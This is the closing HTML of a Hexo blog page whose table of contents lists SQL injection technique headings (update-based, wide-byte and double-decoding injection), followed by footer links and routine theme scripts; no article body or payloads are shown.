href="#基于update的语句"><span class="post-toc-text">基于update的语句</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#宽字节注入："><span class="post-toc-text">宽字节注入：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#二次解码注入："><span class="post-toc-text">二次解码注入：</span></a></li></ol></li></ol></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</div></div></aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
				
				
					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
					
				
					<a href="http://github.com/" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
				
				
					<a href="http://github.com/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
				
					<a href="http://github.com/" title="QQ" target="_blank"><i class="fa fa-qq"></i>&nbsp;</a>
					
				
					<a href="http://github.com/" title="Twitter" target="_blank"><i class="fa fa-twitter"></i>&nbsp;</a>
						
				
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			
				&copy; 2017 - 2019, content by ning. All Rights Reserved.			       	
			
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
		</div>
	</div>
</footer>
		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->

<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>

<style>
	.motto {
		color: #000000;
		font-size: 20px;
		margin: 100px 25% 0;
		width: 50%;
		line-height: 1.4;
		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
		text-align: center;
	}
	@media(max-width: 890px) {
		.motto {	
			margin: 100px 10% 0;
			width: 80%;
		}
	}
	@media(max-width: 890px) {
		.motto {
			margin: 100px 5% 0;
			width: 90%;
		}
	}
</style>


	<script src="/js/motto.js"></script>
	<script type="text/javascript">
		$(".motto").html(getMingYanContent());
	</script>	







	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript">
	//generate a random img that pre_name 'from 0 to 110'
	var random_bg = Math.floor(Math.random() * 109 + 1);

	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
	var bg = 'url(https://XXX-youname-XXX.github.io/Random-img/' + random_bg + '.jpg)';

	$("#header-bg-2").css("background-image", bg);
</script>
		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

